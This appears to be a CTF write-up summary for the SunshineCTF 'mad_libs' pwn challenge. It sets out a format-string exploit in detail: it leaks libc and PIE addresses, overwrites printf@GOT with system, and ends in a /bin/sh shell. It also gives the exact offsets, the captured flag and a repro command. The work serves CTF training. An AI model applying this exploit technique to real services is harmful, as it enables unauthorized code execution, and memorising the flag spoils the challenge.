@@ -1,0 +1,27 @@
+SunshineCTF pwn2 "mad_libs" -- SUMMARY (full Traditional-Chinese teaching notes in notes.md)
+FLAG (real, remote): sun{f1ll_iN_th3_g0T_eNtry}   Files: exploit.py(local+REMOTE), FLAG.txt, notes.md
+VULN : main @ PIE+0x11c9 calls printf(buf) at 0x125f with rdi=&buf -> FORMAT STRING bug.
+       fgets(buf,0x100) into [rbp-0x110] of a 0x120 frame => NO overflow, canary is safe.
+PROT : PIE (base must be leaked) / canary / NX / PARTIAL RELRO: GNU_RELRO ends at 0x4000,
+       .got.plt = 0x3fe8..0x4028 => printf@GOT = 0x4010 is WRITABLE.
+LIBC : Ubuntu GLIBC 2.39-0ubuntu8.3; system=+0x58740, printf=+0x600f0; main's return address
+       = __libc_start_call_main+0x8a = libc+0x2a1ca (call rax; mov edi,eax; call exit).
+FORMAT ARG OFFSETS (measured against /proc/pid/maps, stable -- NOT guessed): printf(buf)
+  runs with rsp=rbp-0x120, so the variadic stack area starts at rbp-0x120:
+  arg6=[rbp-0x120] junk | arg7=[rbp-0x118] junk:loop-counter i | arg8=[rbp-0x110]=buf[0]
+  arg41=canary[rbp-8] | arg42=saved rbp | arg43=retaddr(libc+0x2a1ca) | arg47=main(PIE+0x11c9)
+  => BUF_POS=8 and buf[8k]==arg(8+k).   buf[0] is arg 8, NOT arg 6.
+EXPLOIT (only 3 of the 8 loop iterations are needed):
+  iter1: send "%41$p|%42$p|%43$p|%47$p" -> libc_base=leak43-0x2a1ca, pie_base=leak47-0x11c9
+         (assert both page-aligned; this check also catches a wrong libc/offset)
+  iter2: fmtstr_payload(8, {pie_base+0x4010: p64(libc_base+0x58740)[:6]}, write_size='byte')
+         -> six %hhn writes, 120 bytes, contains no newline
+  iter3: printf("(%d) > ") becomes system("(%d) > ") (harmless sh error on stderr); fgets()
+         reads "/bin/sh"; printf(buf) becomes system("/bin/sh") -> INTERACTIVE SHELL
+PROOF: reading /proc/<pid>/mem, printf@GOT went 0x..2600f0 (libc printf) -> 0x..258740 (system);
+       leaked libc/PIE bases equalled /proc/<pid>/maps exactly.  local 3/3, remote 4/4 OK.
+REPRO: cd /home/kzzz/Documents/code/ctf/sunshine/pwn2 && python3 exploit.py REMOTE < /dev/null
+GOTCHAS: pwnlib.args strips bare argv words -> read "REMOTE" BEFORE `from pwn import *`;
+  no \n in payload (fgets); keep addresses AFTER the directives (printf stops at \x00);
+  address block must be 8-byte aligned; after the write the "(3) > " prompt no longer exists;
+  PIE-libc distance is random (local 0x332000/0x333000/0x39a000; remote PIE 0x5d.., libc 0x74..).
